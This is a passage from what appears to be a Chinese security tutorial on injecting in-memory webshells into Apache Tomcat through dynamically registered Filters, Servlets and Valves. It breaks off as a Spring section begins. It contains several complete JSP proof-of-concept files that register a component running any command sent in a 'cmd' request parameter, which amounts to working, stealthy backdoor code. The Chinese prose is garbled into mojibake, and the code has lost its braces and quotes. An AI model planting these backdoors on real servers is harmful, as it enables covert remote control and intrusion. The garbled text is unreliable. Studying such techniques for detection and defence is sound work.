//åå°„è·å–ApplicationContextFacadeç±»å±æ€§contextä¸ºApplicationContextç±»Field appContextField = servletContext.getClass().getDeclaredField(context);appContextField.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext); //åå°„è·å–ApplicationContextç±»å±æ€§contextä¸ºStandardContextç±»Field standardContextField = applicationContext.getClass().getDeclaredField(context);standardContextField.setAccessible(true);StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext); åˆ›å»ºæ¶æ„Filterpublic class Shell_Filter implements Filter public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException String cmd=request.getParameter(cmd); try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); ä½¿ç”¨FilterDefå°è£…filter//filteråç§°String name = CommonFilter;FilterDef filterDef = new FilterDef();filterDef.setFilter(filter);filterDef.setFilterName(name);filterDef.setFilterClass(filter.getClass().getName());standardContext.addFilterDef(filterDef); åˆ›å»ºfilterMapfilterMapç”¨äºfilterå’Œè·¯å¾„çš„ç»‘å®šï¼Œå³åŠ¨æ€é…ç½®è®¿é—®å†…å­˜é©¬çš„è·¯ç”± FilterMap filterMap = new FilterMap();filterMap.addURLPattern(/*);filterMap.setFilterName(name);filterMap.setDispatcher(DispatcherType.REQUEST.name());standardContext.addFilterMapBefore(filterMap); å°è£…filterConfigåŠfilterDefåˆ°filterConfigsField Configs = standardContext.getClass().getDeclaredField(filterConfigs);Configs.setAccessible(true);Map filterConfigs = (Map) Configs.get(standardContext); Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);constructor.setAccessible(true);ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);filterConfigs.put(name, filterConfig); å®Œæ•´POC%@ page import=java.io.IOException %%@ page import=java.lang.reflect.Field %%@ page import=org.apache.catalina.core.ApplicationContext %%@ page import=org.apache.catalina.core.StandardContext %%@ page import=org.apache.tomcat.util.descriptor.web.FilterDef %%@ page import=org.apache.tomcat.util.descriptor.web.FilterMap %%@ page import=java.lang.reflect.Constructor %%@ page import=org.apache.catalina.core.ApplicationFilterConfig %%@ page import=org.apache.catalina.Context %%@ page import=java.util.Map %%@ page contentType=text/html;charset=UTF-8 language=java % % ServletContext servletContext = request.getSession().getServletContext(); Field appContextField = servletContext.getClass().getDeclaredField(context); appContextField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext); Field standardContextField = applicationContext.getClass().getDeclaredField(context); standardContextField.setAccessible(true); StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);% %! public class Shell_Filter implements Filter public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException String cmd = request.getParameter(cmd); if (cmd != null) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); chain.doFilter(request, response); % % Shell_Filter filter = new Shell_Filter(); String name = CommonFilter; FilterDef filterDef = new FilterDef(); filterDef.setFilter(filter); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); standardContext.addFilterDef(filterDef); FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(/*); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); Field Configs = standardContext.getClass().getDeclaredField(filterConfigs); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(standardContext); Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef); filterConfigs.put(name, filterConfig);% å…ˆè®¿é—®jspæœ¨é©¬ åœ¨ä»»æ„è·¯ç”±è¿›è¡Œæµ‹è¯•ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ Servletå‹é¦–å…ˆè¦å¯¹Tomcatçš„æ¶æ„æœ‰ä¸€å®šçš„äº†è§£ åŒæ ·ï¼Œå…ˆæ¥ä¸€ä¸ªæ¶æ„çš„Servlet package Servlet; import javax.servlet.*;import javax.servlet.annotation.WebServlet;import java.io.IOException; @WebServlet(/shell)public class Shell_Servlet implements Servlet @Override public void init(ServletConfig config) throws ServletException @Override public ServletConfig getServletConfig() return null; @Override public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException String cmd = req.getParameter(cmd); if (cmd !=null) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); @Override public String getServletInfo() return null; @Override public void destroy() æµ‹è¯•ä¹‹åæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ æ¥ä¸‹æ¥åŒæ ·æˆ‘ä»¬éœ€è¦æ€è€ƒè¦æ€ä¹ˆåŠ¨æ€æ³¨å†ŒServletï¼Œæ‰€ä»¥å…ˆçœ‹ä¸€ä¸‹å®ƒçš„åˆ›å»ºè¿‡ç¨‹ åˆ›å»ºè¿‡ç¨‹æˆ‘ä»¬çŸ¥é“Servletçš„ç”Ÿå‘½å‘¨æœŸåˆ†ä¸ºå¦‚ä¸‹äº”éƒ¨åˆ† åŠ è½½ï¼šå½“Tomcatç¬¬ä¸€æ¬¡è®¿é—®Servletçš„æ—¶å€™ï¼ŒTomcatä¼šè´Ÿè´£åˆ›å»ºServletçš„å®ä¾‹ åˆå§‹åŒ–ï¼šå½“Servletè¢«å®ä¾‹åŒ–åï¼ŒTomcatä¼šè°ƒç”¨init()æ–¹æ³•åˆå§‹åŒ–è¿™ä¸ªå¯¹è±¡ å¤„ç†æœåŠ¡ï¼šå½“æµè§ˆå™¨è®¿é—®Servletçš„æ—¶å€™ï¼ŒServlet ä¼šè°ƒç”¨service()æ–¹æ³•å¤„ç†è¯·æ±‚ é”€æ¯ï¼šå½“Tomcatå…³é—­æ—¶æˆ–è€…æ£€æµ‹åˆ°Servletè¦ä»Tomcatåˆ é™¤çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨destroy()æ–¹æ³•ï¼Œè®©è¯¥å®ä¾‹é‡Šæ”¾æ‰æ‰€å çš„èµ„æºã€‚ä¸€ä¸ªServletå¦‚æœé•¿æ—¶é—´ä¸è¢«ä½¿ç”¨çš„è¯ï¼Œä¹Ÿä¼šè¢«Tomcatè‡ªåŠ¨é”€æ¯ å¸è½½ï¼šå½“Servletè°ƒç”¨å®Œdestroy()æ–¹æ³•åï¼Œç­‰å¾…åƒåœ¾å›æ”¶ã€‚å¦‚æœæœ‰éœ€è¦å†æ¬¡ä½¿ç”¨è¿™ä¸ªServletï¼Œä¼šé‡æ–°è°ƒç”¨init()æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–æ“ä½œ Java Webä¸‰å¤§ä»¶çš„åŠ è½½é¡ºåºä¸ºListener-Filter-Servlet åœ¨org.apache.catalina.core.StandardContextç±»çš„startInternal()æ–¹æ³•ä¸­ï¼Œé¦–å…ˆè°ƒç”¨äº†listenerStart()ï¼Œæ¥ç€æ˜¯filterStart()ï¼Œæœ€åæ˜¯loadOnStartup()ã€‚è¿™ä¸‰å¤„è°ƒç”¨è§¦å‘äº†Listenerã€Filterã€Servletçš„æ„é€ åŠ è½½ ...if (ok) if (!listenerStart()) log.error(sm.getString(standardContext.listenerFail)); ok = false; // Check constraints for uncovered HTTP methods // Needs to be after SCIs and listeners as they may programmatically // change constraints if (ok) checkConstraintsForUncoveredMethods(findConstraints()); try // Start manager Manager manager = getManager(); if (manager instanceof Lifecycle) ((Lifecycle) manager).start(); catch(Exception e) log.error(sm.getString(standardContext.managerFail), e); ok = false; // Configure and call application filters if (ok) if (!filterStart()) log.error(sm.getString(standardContext.filterFail)); ok = false; // Load and initialize all load on startup servlets if (ok) if (!loadOnStartup(findChildren())) log.error(sm.getString(standardContext.servletFail)); ok = false; // Start ContainerBackgroundProcessor thread super.threadStart(); finally // Unbinding thread unbindThread(oldCCL); ... åˆ›å»ºStandardWrapperåœ¨StandardContext#startInternalä¸­ï¼Œè°ƒç”¨äº†fireLifecycleEvent()æ–¹æ³•è§£æweb.xmlæ–‡ä»¶ï¼Œæˆ‘ä»¬è·Ÿè¿› ç»§ç»­è·Ÿè¿›lifecycleEventæ–¹æ³• è·Ÿè¿›configureStart()æ–¹æ³• æœ€ç»ˆé€šè¿‡ContextConfig#webConfig()æ–¹æ³•è§£æweb.xmlè·å–å„ç§é…ç½®å‚æ•° ç„¶åé€šè¿‡configureContext(webXml)æ–¹æ³•åˆ›å»ºStandWrapperå¯¹è±¡ï¼Œå¹¶æ ¹æ®è§£æå‚æ•°åˆå§‹åŒ–StandWrapperå¯¹è±¡ è·Ÿè¿›è¯¥æ–¹æ³•ä¸­ private void configureContext(WebXml webxml) // As far as possible, process in alphabetical order so it is easy to // check everything is present // Some validation depends on correct public ID context.setPublicId(webxml.getPublicId()); ... //è®¾ç½®StandardContextå‚æ•° for (ServletDef servlet : webxml.getServlets().values()) //åˆ›å»ºStandardWrapperå¯¹è±¡ Wrapper wrapper = context.createWrapper(); if (servlet.getLoadOnStartup() != null) //è®¾ç½®LoadOnStartupå±æ€§ wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue()); if (servlet.getEnabled() != null) wrapper.setEnabled(servlet.getEnabled().booleanValue()); //è®¾ç½®ServletNameå±æ€§ wrapper.setName(servlet.getServletName()); MapString,String params = servlet.getParameterMap(); for (EntryString, String entry : params.entrySet()) wrapper.addInitParameter(entry.getKey(), entry.getValue()); wrapper.setRunAs(servlet.getRunAs()); SetSecurityRoleRef roleRefs = servlet.getSecurityRoleRefs(); for (SecurityRoleRef roleRef : roleRefs) wrapper.addSecurityReference( roleRef.getName(), roleRef.getLink()); //è®¾ç½®ServletClasså±æ€§ wrapper.setServletClass(servlet.getServletClass()); ... wrapper.setOverridable(servlet.isOverridable()); //å°†åŒ…è£…å¥½çš„StandWrapperæ·»åŠ è¿›ContainerBaseçš„childrenå±æ€§ä¸­ context.addChild(wrapper); for (EntryString, String entry : webxml.getServletMappings().entrySet()) //æ·»åŠ è·¯å¾„æ˜ å°„ context.addServletMappingDecoded(entry.getKey(), entry.getValue()); ... æœ€åé€šè¿‡addServletMappingDecodedæ–¹æ³•æ·»åŠ Servletå¯¹åº”çš„urlæ˜ å°„ åŠ è½½StandWrapperæ¥ç€åœ¨StandardContext#startInternalæ–¹æ³•é€šè¿‡findChildren()è·å–StandardWrapperç±» æœ€åä¾æ¬¡åŠ è½½å®ŒListenerã€Filteråï¼Œå°±é€šè¿‡loadOnStartUp()æ–¹æ³•åŠ è½½wrapper public boolean loadOnStartup(Container children[]) // Collect load on startup servlets that need to be initialized TreeMapInteger, ArrayListWrapper map = new TreeMap(); for (Container child : children) Wrapper wrapper = (Wrapper) child; int loadOnStartup = wrapper.getLoadOnStartup(); //åˆ¤æ–­å±æ€§loadOnStartupçš„å€¼ if (loadOnStartup 0) continue; Integer key = Integer.valueOf(loadOnStartup); ArrayListWrapper list = map.get(key); if (list == null) list = new ArrayList(); map.put(key, list); list.add(wrapper); // Load the collected load on startup servlets for (ArrayListWrapper list : map.values()) for (Wrapper wrapper : list) try wrapper.load(); æ³¨æ„è¿™é‡Œå¯¹äºWrapperå¯¹è±¡ä¸­loadOnStartupå±æ€§çš„å€¼è¿›è¡Œåˆ¤æ–­ï¼Œåªæœ‰å¤§äº0çš„æ‰ä¼šè¢«æ”¾å…¥listè¿›è¡Œåç»­çš„wrapper.load()åŠ è½½è°ƒç”¨ è¿™é‡Œå¯¹åº”çš„å®é™…ä¸Šå°±æ˜¯Tomcat Servletçš„æ‡’åŠ è½½æœºåˆ¶ï¼Œå¯ä»¥é€šè¿‡loadOnStartupå±æ€§å€¼æ¥è®¾ç½®æ¯ä¸ªServletçš„å¯åŠ¨é¡ºåºã€‚é»˜è®¤å€¼ä¸º-1ï¼Œæ­¤æ—¶åªæœ‰å½“Servletè¢«è°ƒç”¨æ—¶æ‰åŠ è½½åˆ°å†…å­˜ä¸­ è‡³æ­¤Servletæ‰è¢«åŠ è½½åˆ°å†…å­˜ä¸­ åŠ¨æ€æ³¨å†ŒServleté€šè¿‡ä¸Šè¿°åˆ†ææˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºåˆ›å»ºServletçš„æµç¨‹ è·å–StandardContextå¯¹è±¡ ç¼–å†™æ¶æ„Servlet é€šè¿‡StandardContext.createWrapper()åˆ›å»ºStandardWrapperå¯¹è±¡ è®¾ç½®StandardWrapperå¯¹è±¡çš„loadOnStartupå±æ€§å€¼ è®¾ç½®StandardWrapperå¯¹è±¡çš„ServletNameå±æ€§å€¼ è®¾ç½®StandardWrapperå¯¹è±¡çš„ServletClasså±æ€§å€¼ å°†StandardWrapperå¯¹è±¡æ·»åŠ è¿›StandardContextå¯¹è±¡çš„childrenå±æ€§ä¸­ é€šè¿‡StandardContext.addServletMappingDecoded()æ·»åŠ å¯¹åº”çš„è·¯å¾„æ˜ å°„ è·å–StandardContextå¯¹è±¡StandardContextå¯¹è±¡è·å–æ–¹å¼å¤šç§å¤šæ · % Field reqF = request.getClass().getDeclaredField(request); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext standardContext = (StandardContext) req.getContext();% æˆ– % ServletContext servletContext = request.getSession().getServletContext(); Field appContextField = servletContext.getClass().getDeclaredField(context); appContextField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext); Field standardContextField = applicationContext.getClass().getDeclaredField(context); standardContextField.setAccessible(true); StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);% ç¼–å†™æ¶æ„Servlet%! public class Shell_Servlet implements Servlet @Override public void init(ServletConfig config) throws ServletException @Override public ServletConfig getServletConfig() return null; @Override public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException String cmd = req.getParameter(cmd); if (cmd !=null) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); @Override public String getServletInfo() return null; @Override public void destroy() % åˆ›å»ºWrapperå¯¹è±¡% Shell_Servlet shell_servlet = new Shell_Servlet(); String name = shell_servlet.getClass().getSimpleName(); Wrapper wrapper = standardContext.createWrapper(); wrapper.setLoadOnStartup(1); wrapper.setName(name); wrapper.setServlet(shell_servlet); wrapper.setServletClass(shell_servlet.getClass().getName());% å°†Wrapperæ·»åŠ è¿›StandardContext% standardContext.addChild(wrapper); standardContext.addServletMappingDecoded(/shell,name);% å®Œæ•´POC%@ page import=java.lang.reflect.Field %%@ page import=org.apache.catalina.core.StandardContext %%@ page import=org.apache.catalina.connector.Request %%@ page import=java.io.IOException %%@ page import=org.apache.catalina.Wrapper %%@ page contentType=text/html;charset=UTF-8 language=java % % Field reqF = request.getClass().getDeclaredField(request); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext standardContext = (StandardContext) req.getContext();% %! public class Shell_Servlet implements Servlet @Override public void init(ServletConfig config) throws ServletException @Override public ServletConfig getServletConfig() return null; @Override public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException String cmd = req.getParameter(cmd); if (cmd !=null) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); @Override public String getServletInfo() return null; @Override public void destroy() % % Shell_Servlet shell_servlet = new Shell_Servlet(); String name = shell_servlet.getClass().getSimpleName(); Wrapper wrapper = standardContext.createWrapper(); wrapper.setLoadOnStartup(1); wrapper.setName(name); wrapper.setServlet(shell_servlet); wrapper.setServletClass(shell_servlet.getClass().getName());% % standardContext.addChild(wrapper); standardContext.addServletMappingDecoded(/shell,name);% è®¿é—®Servlet.jspåŠ¨æ€æ³¨å†ŒServlet ç„¶åè®¿é—®å¯¹åº”çš„æ˜ å°„è·¯å¾„æ‰§è¡Œå‘½ä»¤ Servletå‹å†…å­˜é©¬çš„ç¼ºç‚¹å°±æ˜¯å¿…é¡»è¦è®¿é—®å¯¹åº”çš„è·¯å¾„æ‰èƒ½å‘½ä»¤æ‰§è¡Œï¼Œæ˜“è¢«å‘ç° Valveå‹ä»€ä¹ˆæ˜¯valveï¼Ÿåœ¨äº†è§£Valveä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥ç®€å•äº†è§£ä¸€ä¸‹Tomcatä¸­çš„ç®¡é“æœºåˆ¶ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œå½“Tomcatæ¥æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼Œé¦–å…ˆä¼šä½¿ç”¨Connectorè¿›è¡Œè§£æï¼Œç„¶åå‘é€åˆ°Containerè¿›è¡Œå¤„ç†ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„æ¶ˆæ¯åˆæ˜¯æ€ä¹ˆåœ¨å››ç±»å­å®¹å™¨ä¸­å±‚å±‚ä¼ é€’ï¼Œæœ€ç»ˆé€åˆ°Servletè¿›è¡Œå¤„ç†çš„å‘¢ï¼Ÿè¿™é‡Œæ¶‰åŠåˆ°çš„æœºåˆ¶å°±æ˜¯Tomcatç®¡é“æœºåˆ¶ã€‚ ç®¡é“æœºåˆ¶ä¸»è¦æ¶‰åŠåˆ°ä¸¤ä¸ªåè¯ï¼ŒPipelineï¼ˆç®¡é“ï¼‰å’ŒValveï¼ˆé˜€é—¨ï¼‰ã€‚å¦‚æœæˆ‘ä»¬æŠŠè¯·æ±‚æ¯”ä½œç®¡é“ï¼ˆPipelineï¼‰ä¸­æµåŠ¨çš„æ°´ï¼Œé‚£ä¹ˆé˜€é—¨ï¼ˆValveï¼‰å°±å¯ä»¥ç”¨æ¥åœ¨ç®¡é“ä¸­å®ç°å„ç§åŠŸèƒ½ï¼Œå¦‚æ§åˆ¶æµé€Ÿç­‰ã€‚å› æ­¤é€šè¿‡ç®¡é“æœºåˆ¶ï¼Œæˆ‘ä»¬èƒ½æŒ‰ç…§éœ€æ±‚ï¼Œç»™åœ¨ä¸åŒå­å®¹å™¨ä¸­æµé€šçš„è¯·æ±‚æ·»åŠ å„ç§ä¸åŒçš„ä¸šåŠ¡é€»è¾‘ï¼Œå¹¶æå‰åœ¨ä¸åŒå­å®¹å™¨ä¸­å®Œæˆç›¸åº”çš„é€»è¾‘æ“ä½œã€‚è¿™é‡Œçš„è°ƒç”¨æµç¨‹å¯ä»¥ç±»æ¯”ä¸ºFilterä¸­çš„è´£ä»»é“¾æœºåˆ¶ åœ¨Tomcatä¸­ï¼Œå››å¤§ç»„ä»¶Engineã€Hostã€Contextä»¥åŠWrapperéƒ½æœ‰å…¶å¯¹åº”çš„Valveç±»ï¼ŒStandardEngineValveã€StandardHostValveã€StandardContextValveä»¥åŠStandardWrapperValveï¼Œä»–ä»¬åŒæ—¶ç»´æŠ¤ä¸€ä¸ªStandardPipelineå®ä¾‹ ä¸Filterä¹‹é—´çš„åŒºåˆ« ç‰¹æ€§ Valveï¼ˆé˜€é—¨ï¼‰ Filterï¼ˆè¿‡æ»¤å™¨ï¼‰ å±‚çº§ Tomcat å®¹å™¨çº§åˆ«ï¼ˆæ›´åº•å±‚ï¼‰ Servlet è§„èŒƒçº§åˆ«ï¼ˆåº”ç”¨å±‚ï¼‰ å½±å“èŒƒå›´ å…¨å±€ç”Ÿæ•ˆï¼ˆå½±å“æ‰€æœ‰éƒ¨ç½²åœ¨ Tomcat ä¸­çš„åº”ç”¨ï¼‰ ä»…å¯¹å•ä¸ª Web åº”ç”¨ç”Ÿæ•ˆ å¯è§æ€§ ç”± Tomcat ç›´æ¥ç®¡ç† ç”± Servlet å®¹å™¨ï¼ˆå¦‚ Tomcatï¼‰ç®¡ç† å®Œæ•´çš„è¯·æ±‚æµç¨‹å¦‚ä¸‹ï¼š Tomcat æ¥æ”¶è¯·æ±‚ â†’ Valve é“¾ï¼ˆEngine â†’ Host â†’ Context â†’ Wrapperï¼‰ â†’ Filter é“¾ â†’ Servlet ç®¡é“æœºåˆ¶æµç¨‹åˆ†ææˆ‘ä»¬å…ˆæ¥çœ‹çœ‹Pipelineæ¥å£ï¼Œç»§æ‰¿äº†Containedæ¥å£ public interface Pipeline extends Contained public Valve getBasic(); public void setBasic(Valve valve); public void addValve(Valve valve); public Valve[] getValves(); public void removeValve(Valve valve); public void findNonAsyncValves(SetString result); Pipelineæ¥å£æä¾›äº†å„ç§å¯¹Valveçš„æ“ä½œæ–¹æ³•ï¼Œå¦‚æˆ‘ä»¬å¯ä»¥é€šè¿‡addValve()æ–¹æ³•æ¥æ·»åŠ ä¸€ä¸ªValveã€‚ä¸‹é¢æˆ‘ä»¬å†æ¥çœ‹çœ‹Valveæ¥å£ public interface Valve public Valve getNext(); public void setNext(Valve valve); public void backgroundProcess(); public void invoke(Request request, Response response) throws IOException, ServletException; public boolean isAsyncSupported(); å…¶ä¸­getNext()æ–¹æ³•å¯ä»¥ç”¨æ¥è·å–ä¸‹ä¸€ä¸ªValveï¼ŒValveçš„è°ƒç”¨è¿‡ç¨‹å¯ä»¥ç†è§£æˆç±»ä¼¼Filterä¸­çš„è´£ä»»é“¾æ¨¡å¼ï¼ŒæŒ‰é¡ºåºè°ƒç”¨ã€‚ åŒæ—¶Valveå¯ä»¥é€šè¿‡é‡å†™invoke()æ–¹æ³•æ¥å®ç°å…·ä½“çš„ä¸šåŠ¡é€»è¾‘ class Shell_Valve extends ValveBase @Override public void invoke(Request request, Response response) throws IOException, ServletException ... ä¸‹é¢æˆ‘ä»¬é€šè¿‡æºç çœ‹ä¸€çœ‹ï¼Œæ¶ˆæ¯åœ¨å®¹å™¨ä¹‹é—´æ˜¯å¦‚ä½•ä¼ é€’çš„ã€‚é¦–å…ˆæ¶ˆæ¯ä¼ é€’åˆ°Connectorè¢«è§£æåï¼Œåœ¨org.apache.catalina.connector.CoyoteAdapter#serviceæ–¹æ³•ä¸­ public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception Request request = (Request) req.getNote(ADAPTER_NOTES); Response response = (Response) res.getNote(ADAPTER_NOTES); if (request == null) // Create objects request = connector.createRequest(); request.setCoyoteRequest(req); response = connector.createResponse(); response.setCoyoteResponse(res); // Link objects request.setResponse(response); response.setRequest(request); // Set as notes req.setNote(ADAPTER_NOTES, request); res.setNote(ADAPTER_NOTES, response); // Set query string encoding req.getParameters().setQueryStringCharset(connector.getURICharset()); ... try ... connector.getService().getContainer().getPipeline().getFirst().invoke( request, response); ... å‰é¢æ˜¯å¯¹Requestå’ŒResponeå¯¹è±¡è¿›è¡Œä¸€äº›åˆ¤æ–­åŠåˆ›å»ºæ“ä½œï¼Œæˆ‘ä»¬é‡ç‚¹æ¥çœ‹ä¸€ä¸‹connector.getService().getContainer().getPipeline().getFirst().invoke(request, response) é¦–å…ˆé€šè¿‡connector.getService()æ¥è·å–ä¸€ä¸ªStandardServiceå¯¹è±¡ æ¥ç€é€šè¿‡StandardService.getContainer().getPipeline()è·å–StandardPipelineå¯¹è±¡ã€‚ å†é€šè¿‡StandardPipeline.getFirst()è·å–ç¬¬ä¸€ä¸ªValve @Override public Valve getFirst() if (first != null) return first; return basic; æœ€åé€šè¿‡è°ƒç”¨StandardEngineValve.invoke()æ¥å®ç°Valveçš„å„ç§ä¸šåŠ¡é€»è¾‘ public final void invoke(Request request, Response response) throws IOException, ServletException // Select the Host to be used for this Request Host host = request.getHost(); if (host == null) // HTTP 0.9 or HTTP 1.0 request without a host when no default host // is defined. // Dont overwrite an existing error if (!response.isError()) response.sendError(404); return; if (request.isAsyncSupported()) request.setAsyncSupported(host.getPipeline().isAsyncSupported()); // Ask this Host to process this request host.getPipeline().getFirst().invoke(request, response); host.getPipeline().getFirst().invoke(request, response)å®ç°è°ƒç”¨åç»­çš„Valve åŠ¨æ€æ·»åŠ Valveæ ¹æ®ä¸Šæ–‡çš„åˆ†ææˆ‘ä»¬èƒ½å¤Ÿæ€»ç»“å‡ºValveå‹å†…å­˜é©¬çš„æ³¨å…¥æ€è·¯ è·å–StandardContextå¯¹è±¡ é€šè¿‡StandardContextå¯¹è±¡è·å–StandardPipeline ç¼–å†™æ¶æ„Valve é€šè¿‡StandardPipeline.addValve()åŠ¨æ€æ·»åŠ Valve è·å–StandardPipelineå¯¹è±¡% Field reqF = request.getClass().getDeclaredField(request); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext standardContext = (StandardContext) req.getContext(); Pipeline pipeline = standardContext.getPipeline();% ç¼–å†™æ¶æ„Valveç±»%! class Shell_Valve extends ValveBase @Override public void invoke(Request request, Response response) throws IOException, ServletException String cmd = request.getParameter(cmd); if (cmd !=null) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); % å°†æ¶æ„Valveæ·»åŠ è¿›StandardPipeline% Shell_Valve shell_valve = new Shell_Valve(); pipeline.addValve(shell_valve);% å®Œæ•´POC%@ page import=java.lang.reflect.Field %%@ page import=org.apache.catalina.core.StandardContext %%@ page import=org.apache.catalina.connector.Request %%@ page import=org.apache.catalina.Pipeline %%@ page import=org.apache.catalina.valves.ValveBase %%@ page import=org.apache.catalina.connector.Response %%@ page import=java.io.IOException %%@ page contentType=text/html;charset=UTF-8 language=java % % Field reqF = request.getClass().getDeclaredField(request); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext standardContext = (StandardContext) req.getContext(); Pipeline pipeline = standardContext.getPipeline();% %! class Shell_Valve extends ValveBase @Override public void invoke(Request request, Response response) throws IOException, ServletException String cmd = request.getParameter(cmd); if (cmd !=null) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); % % Shell_Valve shell_valve = new Shell_Valve(); pipeline.addValve(shell_valve);% è®¿é—®Valve.jsp è®¿é—®ä»»æ„è·¯ç”±æ‰§è¡Œå‘½ä»¤ Springå†…å­˜é©¬SpringåŸºç¡€æ¦‚å¿µSpringçš„å‡ºç°å¤§å¤§ç®€åŒ–äº†JavaEEçš„å¼€å‘æµç¨‹ï¼Œå‡å°‘äº†Javaå¼€å‘æ—¶å„ç§ç¹ççš„é…ç½® Springæ¡†æ¶çš„æ ¸å¿ƒä¹‹ä¸€å°±æ˜¯åˆ†å±‚ï¼Œå…¶ç”±è®¸å¤šå¤§å¤§å°å°çš„ç»„ä»¶æ„æˆï¼Œæ¯ç§ç»„ä»¶éƒ½å®ç°ä¸åŒåŠŸèƒ½ SpringBootSpringBoot åŸºäº Spring å¼€å‘ã€‚ä¸ä»…ç»§æ‰¿äº†Springæ¡†æ¶åŸæœ‰çš„ä¼˜ç§€ç‰¹æ€§ï¼Œå®ƒå¹¶ä¸æ˜¯ç”¨æ¥æ›¿ä»£ Spring çš„è§£å†³æ–¹æ¡ˆï¼Œè€Œå’Œ Spring æ¡†æ¶ç´§å¯† ç»“åˆè¿›ä¸€æ­¥ç®€åŒ–äº†Springåº”ç”¨çš„æ•´ä¸ªæ­å»ºå’Œå¼€å‘è¿‡ç¨‹ã€‚å…¶è®¾è®¡ç›®çš„æ˜¯ç”¨æ¥ç®€åŒ– Spring åº”ç”¨çš„åˆå§‹æ­å»ºä»¥åŠå¼€å‘è¿‡ç¨‹ã€‚ é‡‡ç”¨ Spring Boot å¯ä»¥å¤§å¤§çš„ç®€åŒ–å¼€å‘æ¨¡å¼ï¼Œå®ƒé›†æˆäº†å¤§é‡å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“é…ç½®ï¼Œæ‰€æœ‰ä½ æƒ³é›†æˆçš„å¸¸ç”¨æ¡†æ¶ï¼Œå®ƒéƒ½æœ‰å¯¹åº”çš„ç»„ä»¶æ”¯æŒï¼Œä¾‹å¦‚ Redisã€MongoDBã€Dubboã€kafkaï¼ŒESç­‰ç­‰ã€‚SpringBoot åº”ç”¨ä¸­è¿™äº›ç¬¬ ä¸‰æ–¹åº“å‡ ä¹å¯ä»¥é›¶é…ç½®åœ°å¼€ç®±å³ç”¨ï¼Œå¤§éƒ¨åˆ†çš„ SpringBoot åº”ç”¨éƒ½åªéœ€è¦éå¸¸å°‘é‡çš„é…ç½®ä»£ç ï¼Œå¼€å‘è€…èƒ½å¤Ÿæ›´åŠ ä¸“æ³¨äºä¸šåŠ¡é€»è¾‘ã€‚ å¦å¤–SpringBooté€šè¿‡é›†æˆå¤§é‡çš„æ¡†æ¶ä½¿å¾—ä¾èµ–åŒ…çš„ç‰ˆæœ¬å†²çªï¼Œä»¥åŠå¼•ç”¨çš„ä¸ç¨³å®šæ€§ç­‰é—®é¢˜å¾—åˆ°äº†å¾ˆå¥½çš„è§£å†³ã€‚ ä¸‹é¢æˆ‘ä»¬å°±é€šè¿‡IDEAä¸­çš„Spring Initializræ¥å¿«é€Ÿæ„å»ºä¸€ä¸ªåŸºäºSpringBootçš„Webé¡¹ç›® ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œé€‰æ‹©spring web ç›´æ¥åˆ›å»ºå°±è¡Œäº† æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥ç¼–å†™ç›¸åº”çš„Controllerï¼ˆæ§åˆ¶å™¨ï¼‰åŠå„ç§ä¸šåŠ¡é€»è¾‘äº† package org.example.spring_test.hello;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;@Controllerpublic class HelloWorldController @ResponseBody @RequestMapping(helloworld) public String hello() return Hello World; è®¿é—®å¯¹åº”çš„è·¯ç”± Spring MVCã€Tomcatå’ŒServleté¦–å…ˆæ¥è®¾æƒ³è¿™æ 